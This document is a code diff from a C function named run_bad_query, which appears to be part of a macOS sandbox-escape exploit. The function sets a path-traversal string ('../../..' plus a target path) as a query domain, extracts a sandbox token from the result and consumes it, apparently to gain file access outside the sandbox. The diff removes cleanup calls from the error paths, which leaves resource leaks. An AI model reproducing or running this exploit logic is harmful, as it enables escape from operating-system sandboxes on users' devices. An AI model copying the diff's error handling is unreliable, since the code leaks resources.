@@ -95,11 +95,11 @@ static int64_t run_bad_query(char *path, bool create, char *group_identifier, bo
     char *part = NULL;
     if (group_identifier == NULL) {
         if (asprintf(&part, "../../../../../../../..%s", path) == -1) {
-            xpc_release(identifier); query_free(query); dlclose(mgr); return -5;
+            dlclose(mgr); return -5;
         }
     } else {
         if (asprintf(&part, "../../../../../../../../..%s", path) == -1) {
-            xpc_release(identifier); query_free(query); dlclose(mgr); return -5;
+            dlclose(mgr); return -5;
         }
     }
     query_set_part_domain(query, part);
@@ -112,12 +112,12 @@ static int64_t run_bad_query(char *path, bool create, char *group_identifier, bo
 
     void *result = query_get_result(query);
     if (!result) {
-        free(part); xpc_release(identifier); query_free(query); dlclose(mgr); return -3;
+        free(part); dlclose(mgr); return -3;
     }
 
     char *token = copy_sandbox_token(result);
     if (!token) {
-        free(part); xpc_release(identifier); query_free(query); dlclose(mgr); return -4;
+        free(part); dlclose(mgr); return -4;
     }
 
     int64_t handle = consume_extension(token);
